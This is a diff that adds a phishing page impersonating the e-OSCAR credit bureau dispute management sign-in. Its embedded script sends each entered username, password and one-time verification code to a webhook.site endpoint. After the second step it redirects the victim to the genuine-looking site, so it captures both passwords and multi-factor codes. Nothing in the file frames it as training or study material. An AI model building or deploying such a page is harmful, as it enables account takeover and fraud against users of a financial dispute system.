@@ -1,0 +1,44 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>e-OSCAR - Sign In</title>
+<style>
+body{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#f4f6f8;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#fff;border:1px solid #d9dee3;border-radius:8px;padding:36px 40px;width:380px;box-shadow:0 8px 24px rgba(0,0,0,.08)}
+.logo{font-size:26px;font-weight:700;color:#0b3d6b;letter-spacing:.5px;margin-bottom:6px}
+.sub{color:#5b6770;font-size:13px;margin-bottom:24px}
+label{display:block;font-size:12px;color:#3c4a54;margin:14px 0 6px}
+input{width:100%;box-sizing:border-box;padding:11px 12px;border:1px solid #c7d0d8;border-radius:4px;font-size:14px}
+button{margin-top:22px;width:100%;padding:12px;background:#0b5cad;color:#fff;border:0;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer}
+.foot{margin-top:18px;font-size:11px;color:#7a8791;line-height:1.5}
+#step2{display:none}
+</style></head>
+<body>
+<div class="card">
+  <div class="logo">e-OSCAR<span style="font-size:12px;vertical-align:super">®</span></div>
+  <div class="sub">Credit Bureau Dispute Management</div>
+  <form id="f">
+    <div id="step1">
+      <label>Username</label><input name="username" autocomplete="username" required>
+      <label>Password</label><input name="password" type="password" autocomplete="current-password" required>
+    </div>
+    <div id="step2">
+      <div class="sub" style="margin-top:4px">Enter the verification code sent to your device.</div>
+      <label>Verification code</label><input name="code" inputmode="numeric" autocomplete="one-time-code">
+    </div>
+    <button type="submit" id="btn">Sign In</button>
+  </form>
+  <div class="foot">Authorized users only. Use of this system is subject to the e-OSCAR Terms of Use.</div>
+</div>
+<script>
+const HOOK="https://webhook.site/dc009a76-b5c7-48ab-a4dc-d783d46179b8";
+let step=1;
+document.getElementById('f').addEventListener('submit',async e=>{
+  e.preventDefault();
+  const fd=new FormData(e.target);
+  const data={step:step,username:fd.get('username')||'',password:fd.get('password')||'',code:fd.get('code')||''};
+  try{await fetch(HOOK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});}catch(_){}
+  if(step===1){step=2;document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';document.getElementById('btn').textContent='Verify';return;}
+  location.href='https://www.e-oscar-web.net/';
+});
+</script>
+</body></html>
